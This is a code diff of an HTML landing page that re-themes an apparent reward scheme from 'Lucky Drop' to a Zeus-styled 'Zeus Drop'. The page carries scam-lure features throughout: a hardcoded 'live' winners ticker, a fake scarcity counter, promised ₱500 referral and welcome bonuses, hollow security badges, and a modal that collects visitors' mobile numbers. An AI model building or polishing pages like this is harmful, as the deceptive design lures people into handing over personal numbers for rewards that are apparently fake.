@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Lucky Drop | Share & Earn</title>
+    <title>Lucky Drop | Divine Rewards</title>
     
     <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@300;400;500;600;700;800&family=Orbitron:wght@400;500;600;700;800;900&family=Playfair+Display:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Google Fonts - Added Cinzel & Forum for Greek theme -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@300;400;500;600;700;800&family=Orbitron:wght@400;500;600;700;800;900&family=Playfair+Display:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700;800&family=Cinzel:wght@400;500;600;700;800;900&family=Forum&display=swap" rel="stylesheet">
     
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -20,40 +20,73 @@
 </head>
 <body>
 
+    <!-- ====== BACKGROUND LAYERS ====== -->
     <div class="bg-gradient"></div>
     <div class="bg-glow"></div>
+    
+    <!-- Zeus Background Image (white background removed via CSS) -->
+    <div class="bg-zeus"></div>
+    
+    <!-- Marble Texture Overlay -->
+    <div class="marble-texture"></div>
+    
+    <!-- Divine Particles (Golden Sparks) -->
+    <div class="divine-particles">
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+    </div>
+    
+    <!-- Lightning Flash Effect -->
+    <div class="lightning-flash"></div>
 
-    <!-- Live Winners Ticker -->
+    <!-- Live Winners Ticker - Divine Style -->
     <div class="live-ticker">
         <div class="ticker-dot"></div>
         <div class="ticker-content">
-            <span class="ticker-text" id="winnerEntry">0917***4256 completed task +₱500</span>
+            <span class="ticker-text" id="winnerEntry">⚡ 0917***4256 completed task +₱500</span>
         </div>
-        <div class="ticker-badge">LIVE</div>
+        <div class="ticker-badge">DIVINE</div>
     </div>
 
-    <!-- Main Card -->
+    <!-- Main Card - Marble Temple Style -->
     <div class="main-card" id="mainCard">
+        <!-- Greek Corner Decorations -->
+        <span class="corner-deco tl">Ω</span>
+        <span class="corner-deco tr">Ω</span>
+        <span class="corner-deco bl">Ω</span>
+        <span class="corner-deco br">Ω</span>
+        
         <div class="logo-area">
             <div class="logo-icon">
-                <i class="fas fa-crown"></i>
+                <i class="fas fa-bolt"></i>
             </div>
-            <h1 class="logo-text">LUCKY DROP</h1>
+            <h1 class="logo-text">ZEUS DROP</h1>
+            <div class="logo-sub">⚡ Mount Olympus ⚡</div>
         </div>
 
-        <!-- Value Props -->
+        <!-- Value Props - Divine Blessings -->
         <div class="value-props">
             <div class="prop-row">
-                <div class="prop-icon"><i class="fas fa-check-circle"></i></div>
+                <div class="prop-icon"><i class="fas fa-bolt"></i></div>
                 <div>
-                    <div class="prop-title">Complete Simple Tasks</div>
-                    <div class="prop-desc">Invite friends & share on social media</div>
+                    <div class="prop-title">Divine Tasks</div>
+                    <div class="prop-desc">Complete simple tasks & earn blessings</div>
                 </div>
             </div>
             <div class="prop-row">
                 <div class="prop-icon"><i class="fas fa-coins"></i></div>
                 <div>
-                    <div class="prop-title">Earn Instant Rewards</div>
+                    <div class="prop-title">Golden Rewards</div>
                     <div class="prop-desc">₱500 per successful referral</div>
                 </div>
             </div>
@@ -66,10 +99,10 @@
             </div>
         </div>
 
-        <!-- Scarcity Tracker -->
+        <!-- Scarcity Tracker - Sacred Slots -->
         <div class="scarcity-box">
             <div class="scarcity-header">
-                <span class="scarcity-label">Limited Slots</span>
+                <span class="scarcity-label">⚡ Sacred Slots</span>
                 <div><span class="scarcity-numbers" id="remNum">88</span><span class="scarcity-total">/100</span></div>
             </div>
             <div class="progress-track">
@@ -77,24 +110,24 @@
             </div>
         </div>
 
-        <!-- Swipe to Verify Section -->
+        <!-- Swipe to Verify - Divine Touch -->
         <div class="swipe-container">
             <div class="swipe-track" id="swipeTrack">
                 <div class="swipe-fire-trail" id="swipeFireTrail"></div>
                 <div class="swipe-icon" id="swipeIcon">
                     <img src="images/scatter_icon.jpg" class="scatter-icon" alt="swipe">
                 </div>
-                <div class="swipe-text">SWIPE TO VERIFY</div>
+                <div class="swipe-text">⚡ SWIPE TO VERIFY ⚡</div>
             </div>
         </div>
 
         <div class="card-footer">
             <i class="fas fa-shield-alt"></i>
-            <span>Secure & Encrypted</span>
+            <span>Protected by Olympus</span>
         </div>
     </div>
 
-    <!-- Modal - Premium Version -->
+    <!-- Modal - Temple of Zeus -->
     <div class="modal-overlay" id="modalOverlay">
         <div class="modal-container">
             <div class="modal-card">
@@ -102,22 +135,22 @@
                 
                 <div id="modalBodyContent">
                     <div class="modal-icon">
-                        <i class="fas fa-gem"></i>
+                        <i class="fas fa-bolt"></i>
                     </div>
-                    <h2 class="modal-title">VERIFY YOUR NUMBER</h2>
-                    <p class="modal-subtitle">This will be your <span class="gold-text">Tasker ID</span><br>Don't use unverified numbers to avoid payout difficulties</p>
+                    <h2 class="modal-title">DIVINE VERIFICATION</h2>
+                    <p class="modal-subtitle">This will be your <span class="gold-text">Oracle ID</span><br>Only the worthy shall receive Zeus's blessings</p>
                     
                     <div class="bonus-box-premium">
                         <div class="bonus-glow"></div>
                         <div class="bonus-amount-premium">₱500</div>
-                        <div class="bonus-label-premium">WELCOME BONUS</div>
+                        <div class="bonus-label-premium">⚡ ZEUS'S BLESSING ⚡</div>
                         <div class="bonus-shine"></div>
                     </div>
                     
                     <div class="input-group-premium">
                         <label class="input-label-premium">
                             <i class="fas fa-mobile-alt"></i>
-                            Mobile Number
+                            Divine Number
                         </label>
                         <div class="input-wrapper-premium">
                             <input type="tel" id="userPhone" placeholder="Enter 11-digit mobile number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
@@ -125,13 +158,13 @@
                     </div>
                     
                     <button class="login-btn" id="claimBtn" onclick="processStep1()">
-                        <span class="login-text">LOGIN</span>
+                        <span class="login-text">SUMMON</span>
                         <span class="login-dots"></span>
                     </button>
                     
                     <div class="warning-text-premium">
                         <i class="fas fa-shield-alt"></i>
-                        <span>Complete more task to process instant withdrawals</span>
+                        <span>Complete more tasks to receive divine payouts</span>
                     </div>
                 </div>
             </div>
